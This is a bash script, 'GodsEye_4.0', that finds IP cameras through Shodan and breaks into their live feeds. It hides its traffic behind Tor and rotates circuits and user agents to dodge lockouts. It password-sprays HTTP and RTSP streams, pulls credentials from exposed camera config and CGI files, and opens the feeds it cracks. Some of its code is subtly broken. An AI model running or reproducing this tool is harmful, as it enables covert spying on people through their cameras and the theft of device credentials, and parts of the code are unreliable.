#!/bin/bash
# GodsEye_4.0 (Public)
# Pentest camera feeds on a IP address

# Remove any pre-existing target sheets and pulled credential dictionaries
rm -f targets.txt
rm -f failed_addresses.txt
rm -f failed_auth.txt
rm -f pulled_creds.txt

echo " GodsEye_4.0 "

# Ask for the target IP address
read -p "Enter Target IP address: " SINGLE_TARGET

# Ask for the number of feeds
read -p "Enter number of feeds to test: " num_feeds

# Perform Shodan search for single target
shodan search --limit "$num_feeds" --fields ip_str,port --separator : 'ip:'$SINGLE_TARGET' title:"Internet Camera, live view, PelcoNet, +tm01+, PTZ Internet Camera, WVC210, CAMERA Viewer, NetCamXL Live Image, Live Images, webcamxp, webcam 7, dome camera, yawcam, IP Webcam Server, camera 1, sanyo, axis, IPCamera-web, Vivotek, Wireless Camera, Internet Camera, brickcom, Surveillance Camera, TeleEye, mjpg streamer, divar, camera" -port:443 200 ok' | tee -a ips.txt

# Move acquired targets to the targets list
while IFS= read -r line; do
    echo "${line%?}" >> 1targets.txt
done < "ips.txt"

# Remove blank lines on targets.txt to prevent errors
awk NF 1targets.txt > targets.txt

rm ips.txt
rm 1targets.txt

# Anonymizing all traffic and starting nyx to monitor traffic
sudo anonsurf start 
sleep 10
qterminal -e sudo -u debian-tor nyx &
sleep 10

# Begin target address connection checks

# Paths to your files
TARGETS_FILE="targets.txt"
SUFFIXES_FILE="suffixes.txt"
CREDENTIALS_FILE="credentials.txt"
FAILED_ADDRESSES_FILE="failed_addresses.txt"
FAILED_AUTH_FILE="failed_auth.txt"
PULLED_CREDS_FILE="pulled_creds.txt"
USER_AGENT_FILE="user_agent.txt"

# Create an array to store successful URLs
successful_urls=()

# Read the suffixes into an array
mapfile -t suffixes < "$SUFFIXES_FILE"

# Read all lines from targets.txt into an array
mapfile -t addresses < "$TARGETS_FILE"

# Read the user agents into an array
mapfile -t user_agents < "$USER_AGENT_FILE"

# Function to switch Tor circuit
switch_tor_circuit() {
    echo "Switching Tor circuit..."
    sudo anonsurf change
    sudo pkill nyx
    sleep 10  # Give Tor time to establish a new circuit
    qterminal -e sudo -u debian-tor nyx &
    sleep 5
}

# Counter for failed authentication attempts
failed_attempts=2

# Function to generate a random User-Agent string
get_random_user_agent() {
    echo "${user_agents[$RANDOM % ${#user_agents[@]}]}"
}

# Function to check if a feed is valid using ffmpeg
check_feed() {
    local address=$1
    local port=$2
    local is_http=$3
    local user_agent="${get_random_user_agent}"

    if [ "$is_http" == "true" ]; then
        for suffix in "${suffixes[@]}"; do
            url="http://${address}:${port}${suffix}"
            echo "Checking URL: $url"
            if ffmpeg -headers "User-Agent: $user_agent" -i "$url" -t 1 -vframes 1 -f null - &>/dev/null; then
                echo "Successfully connected to $url"
                echo "----------------------------------------"
                successful_urls+=("$url")
                return 0
            else
                echo "Failed to connect to $url"
            fi
        done
    else
        url="rtsp://${address}:${port}"
        echo "Checking RTSP URL: $url"
        if ffmpeg -headers "User-Agent: $user_agent" -i "$url" -t 1 -vframes 1 -f null - &>/dev/null; then
            echo "Successfully connected to $url"
            echo "----------------------------------------"
            successful_urls+=("$url")
            return 0
        else
            echo "Failed to connect to $url"
        fi
    fi

    # Check if the address is already in the failed addresses file before adding
    if ! grep -q "$address:$port" "$FAILED_ADDRESSES_FILE"; then
        echo "$address:$port" >> "$FAILED_ADDRESSES_FILE"
    fi
    return 1
}

# Function to spray credentials across multiple addresses and suffixes (Password Sprayer)
authenticate_feed() {
    local address=$1
    local port=$2
    local creds_file=$3
    local max_failed_attempts=2  # Number of failed attempts before switching circuits
    declare -A failed_attempts_map  # Map to store failed attempts per address

    # Read credentials from the credentials file
    while IFS= read -r credentials; do
        local username="${credentials%%:*}"
        local password="${credentials##*:}"

        # Attempt authentication across all suffixes for the current address
        for suffix in "${suffixes[@]}"; do
            local url="http://${username}:${password}@${address}:${port}${suffix}"
            echo "Trying to authenticate with URL: $url"

            # Check if authentication is successful
            if ffmpeg -headers "User-Agent: $(get_random_user_agent)" -i "$url" -t 1 -vframes 1 -f null - &>/dev/null; then
                echo "Authentication successful for $url"
                echo "----------------------------------------"
                successful_urls+=("$url")
                return 0
            else
                echo "Authentication failed for $url"
                ((failed_attempts_map["$address"]++))  # Increment failure counter for this address
            fi

            # Check if any address has reached the max failed attempts
            for addr in "${!failed_attempts_map[@]}"; do
                if [ "${failed_attempts_map[$addr]}" -ge "$max_failed_attempts" ]; then
                    echo "Switching tor circuit after ${failed_attempts_map[$addr]} failed attempts on $addr"
                    switch_tor_circuit
                    # Reset failed attempts for all addresses after circuit switch
                    for key in "${!failed_attempts_map[@]}"; do
                        failed_attempts_map["$key"]=0
                    done
                    break
                fi
            done
        done
    done < "$creds_file"

    # If all attempts fail, log the address and port to the failure log
    echo "$address:$port" >> "$FAILED_AUTH_FILE"
    return 1
}

# Function to attempt to download config files and grep usernames and passwords to a new dictionary.
wget_attempt() {
    local address=$1
    local port=$2
    local user_agent="${get_random_user_agent}"
    local timeout=30  # 30 seconds timeout
    local failed_attempts=0  # Initialize failed attempts counter

    if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/scripts/logfiles.tar.gz"; then
            tar -xzf config_files/logfiles.tar.gz
            datuser=$(grep 'userID="' config_files/config.dat | sed 's/.*userID"\([^"]*\)".*/\1/')
            datpass=$(grep 'password="' config_files/config.dat | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$datuser:$datpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/logfiles.tar.gz
            rm ./config_files/config.dat
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
           
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/conf/fastcgi.conf"; then
            confuser=$(grep 'username="' config_files/fastcgi.conf | sed 's/.*username"\([^"]*\)".*/\1/')
            confpass=$(grep 'password="' config_files/fastcgi.conf | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$confuser:$confpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/fastcgi.conf
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
            
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/web/cgi-bin/hi3510/param.cgi"; then
            parauser=$(grep 'username="' config_files/param.cgi | sed 's/.*username"\([^"]*\)".*/\1/')
            parapass=$(grep 'password="' config_files/param.cgi | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$parauser:$parapass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/param.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
                
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/cgi-bin/api.cgi"; then
            apiuser=$(grep 'username="' config_files/api.cgi | sed 's/.*username"\([^"]*\)".*/\1/')
            apipass=$(grep 'password="' config_files/api.cgi | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$apiuser:$apipass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/api.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
               
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/check.cgi"; then
            checkuser=$(grep 'username="' config_files/check.cgi | sed 's/.*username"\([^"]*\)".*/\1/')
            checkpass=$(grep 'password="' config_files/check.cgi | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$checkuser:$checkpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/check.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
                
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/chklogin.cgi"; then
            chkluser=$(grep 'username="' config_files/chklogin.cgi | sed 's/.*username"\([^"]*\)".*/\1/')
            chklpass=$(grep 'password="' config_files/chklogin.cgi | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$chkluser:$chklpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/chklogin.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
                
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/cgi-bin/readfile.cgi"; then
            readuser=$(grep 'Adm_ID="' config_files/readfile.cgi | sed 's/.*Adm_ID"\([^"]*\)".*/\1/')
            readpass=$(grep 'Adm_pass1="' config_files/readfile.cgi | sed 's/.*Adm_pass1"\([^"]*\)".*/\1/')
            echo "$readuser:$readpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/readfile.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
                
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/cgi-bin/cameralist/cameralist.cgi"; then
            camuser=$(grep 'username="' config_files/cameralist.cgi | sed 's/.*username"\([^"]*\)".*/\1/')
            campass=$(grep 'password="' config_files/cameralist.cgi | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$camuser:$campass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/cameralist.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
            
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/cgi-bin/cameralist/setcamera.cgi"; then
            setuser=$(grep 'username="' config_files/setcamera.cgi | sed 's/.*username"\([^"]*\)".*/\1/')
            setpass=$(grep 'password="' config_files/setcamera.cgi | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$setuser:$setpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/setcamera.cgi
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
                     
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/tmpfs/config_backup.bin"; then
            binuser=$(grep 'username="' config_files/config_backup.bin | sed 's/.*username"\([^"]*\)".*/\1/')
            binpass=$(grep 'password="' config_files/config_backup.bin | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$binuser:$binpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/config_backup.bin
        else
            ((failed_attempts++))  # Increment failed attempts
        fi
            
        if wget --timeout="$timeout" --tries=1 --user-agent="$user_agent" -P ./config_files "http://${address}:${port}/ap_mode.cfg"; then
            cfguser=$(grep 'username="' config_files/ap_mode.cfg | sed 's/.*username"\([^"]*\)".*/\1/')
            cfgpass=$(grep 'password="' config_files/ap_mode.cfg | sed 's/.*password"\([^"]*\)".*/\1/')
            echo "$cfguser:$cfgpass" >> "$PULLED_CREDS_FILE"
            rm ./config_files/ap_mode.cfg
        else
            ((failed_attempts++))  # Increment failed attempts
        fi    
    
        if [ "$failed_attempts" -ge 2 ]; then
                echo "Switching tor circuit after $failed_attempts failed attempts on $address"
                switch_tor_circuit
                failed_attempts=0  # Reset counter after switching circuits
        fi
}

# Process each address from the array
for line in "${addresses[@]}"; do
    echo "Raw line: '$line'"
    
    line=$(echo "$line" | tr -d '\r' | xargs)
    
    address="${line%%:*}"
    port="${line##*:}"
    
    echo "Parsed address: '$address', Parsed port: '$port'"
    echo "Checking feed at ${address}:${port}..."
    echo "----------------------------------------"
    

    # Check the feed first with HTTP
    if check_feed "$address" "$port" "true"; then
        continue
    fi

    # If HTTP fails, check with RTSP
    check_feed "$address" "$port" "false"
done

# Perform authentication check on failed addresses
if [ -f "$FAILED_ADDRESSES_FILE" ]; then
    while IFS=: read -r address port; do
        # Run each address-port combination in parallel
        authenticate_feed "$address" "$port" "$CREDENTIALS_FILE" &
    done < "$FAILED_ADDRESSES_FILE"
    
    # Wait for all parallel jobs to complete
    wait
fi

# Wget attempt on failed authentication addresses
if [ -f "$FAILED_AUTH_FILE" ]; then
    while IFS=: read -r address port; do
        wget_attempt "$address" "$port"
    done < "$FAILED_AUTH_FILE"
fi

# Perform a final authentication attempt using the pulled credentials
if [ -f "$PULLED_CREDS_FILE" ]; then
    while IFS=: read -r address port; do
        authenticate_feed "$address" "$port" "$PULLED_CREDS_FILE" &
    done < "$FAILED_AUTH_FILE"
    
    # Wait for all parallel jobs to complete
    wait
fi

# Open each successful HTTP feed in a new Firefox window
if [ ${#successful_urls[@]} -gt 0 ]; then
    echo "Opening each successful HTTP feed in its own Firefox window..."
    for url in "${successful_urls[@]}"; do
        # Check if the URL is HTTP or RTSP
        if [[ "$url" == http* ]]; then
            firefox -width=450 -height=450 --new-window "$url" &
        fi
    done
    sleep 3  # Allow some time for each window to open
else
    echo "No successful HTTP connections found."
fi

# Open each successful RTSP feed in VLC
if [ ${#successful_urls[@]} -gt 0 ]; then
    echo "Opening each successful RTSP feed in VLC..."
    for url in "${successful_urls[@]}"; do
        # Check if the URL is RTSP
        if [[ "$url" == rtsp* ]]; then
            cvlc --no-video-deco --no-embedded-video "$url" &
        fi
    done
else
    echo "No successful RTSP connections found."
fi

# Exit script
exit 0
